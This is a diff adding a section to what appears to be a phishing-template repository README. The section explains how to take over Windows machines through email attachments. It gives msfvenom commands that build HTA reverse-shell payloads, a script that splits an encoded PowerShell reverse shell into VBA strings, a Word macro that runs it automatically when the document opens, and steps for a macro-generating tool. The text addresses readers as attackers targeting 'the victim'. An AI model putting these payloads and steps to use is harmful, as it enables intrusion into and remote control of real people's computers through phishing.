@@ -76,6 +76,78 @@ You can read this article to get more information about how to set up a phishing
 ```
 https://www.hackercoolmagazine.com/gophish-setup-a-phishing-campaign/
 ```
+# 
+#
+# How to Compromise Windows 🦋 system
+***You can add this payload to your phishing email. When the victim installs & open this malicious file, you'll get your shell 🐚***
+
+# HTA Attack in Action
+
+We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. 
+In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
+```
+## Exploiting Microsoft Windows using MS Word Macro [ Manually ] 🐓
+The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.
+
+Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
+```
+Create the .doc file
+Use the base64 powershell code from revshells.com
+```
+Used this code to inline macro(Paste the code from revshells in str variable) :
+```
+str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+
+n = 50
+
+for i in range(0, len(str), n):
+    print "Str = Str + " + '"' + str[i:i+n] + '"'
+```
+```
+Sub AutoOpen()
+
+  MyMacro
+
+End Sub
+
+Sub Document_Open()
+
+  MyMacro
+
+End Sub
+
+Sub MyMacro()
+
+    Dim Str As String
+
+   <b>Paste the script output here!<b>
+
+    CreateObject("Wscript.Shell").Run Str
+
+End Sub
+```
+## Exploiting Microsoft Windows using MS Word Macro [Automation Script] 🪿
+If the thought of manually crafting a macro exploit seems feels like a headache then This tool simplifies the process, which automatically generate MW word macros which contain's your RCE payload code.
+
+***Minitrue***
+```
+git clone https://github.com/X0RW3LL/Minitrue.git
+```
+```
+cd /opt/WindowsMacros/Minitrue
+./minitrue
+select a payload: windows/x64/shell_reverse_tcp
+select the payload type: VBA Macro
+LHOST=$yourIP
+LPORT=$yourPort
+Payload encoder: None
+Select or enter file name (without extensions): hacker
+```
+
 
 ## Disclaimer
 The files in this repository were created and modified by me,  for my own personal use and come with no guarantee to work for you. I provide these files "as-is" and offer no support whatsoever to get them working. A lot of these files use terrible formatted and layered tables, anyone working with email and newsletter designs knows how painful they can be, and how worse it is to reverse-engineer those.🦆 
